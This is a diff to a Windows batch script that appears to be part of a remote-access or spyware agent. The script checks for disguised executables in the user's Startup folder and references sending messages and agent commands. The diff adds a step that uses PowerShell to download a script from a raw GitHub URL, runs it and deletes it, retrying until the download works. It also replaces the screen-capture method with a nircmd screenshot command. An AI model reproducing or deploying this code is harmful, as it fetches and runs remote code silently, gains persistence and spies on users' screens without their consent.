@@ -176,12 +176,16 @@ timeout /t 1 /nobreak >nul
 set "file1=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
 set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
 set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
+set "file4=%APPDATA%\Microsoft\nircmd.exe"
+
+
 
 
 :: Check each file
 if not exist "%file1%" goto STARTUPTAASK
 if not exist "%file2%" goto STARTUPTAASK
 if not exist "%file3%" goto STARTUPTAASK
+if not exist "%file4%" goto STARTUPTAASK
 
 
 
@@ -312,7 +316,7 @@ set "CheckSend=1"
 :CheckKMSAuto
 :: Check KMSAuto.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe" (
-    goto COMMANDSFORAGENTS
+    goto CheckNIRCMD
 )
 
 :: Run commands if KMSAuto.exe is not found
@@ -337,6 +341,36 @@ set "MESSAGE=%MESSAGE%KMSAuto|"
 set "CheckSend=1"
 
 
+
+
+
+
+:CheckNIRCMD
+:: Check nircmd.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\nircmd.exe" (
+    goto COMMANDSFORAGENTS
+)
+
+:: Run commands if Nircmd.exe is not found
+echo Checking for Nircmd...
+set "embeddedScript=temp_script_Nircmd.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Nircmd') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from NIRCMD Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckNIRCMD
+)
+
+set "MESSAGE=%MESSAGE%NIRCMD|"
+set "CheckSend=1"
 
 
 
@@ -482,7 +516,8 @@ if "%CheckSend%"=="1" (
 
 
 
-PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size); $Bitmap.Save('%USERPROFILE%\Downloads\screenshot.png');"
+"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Desktop\screenshot.png"
+
 
 
 
@@ -536,3 +571,5 @@ if %loopCount% lss 6 (
     :: If 5 , end the script
     echo Loop completed 5 times. Exiting script.
 )
+
+
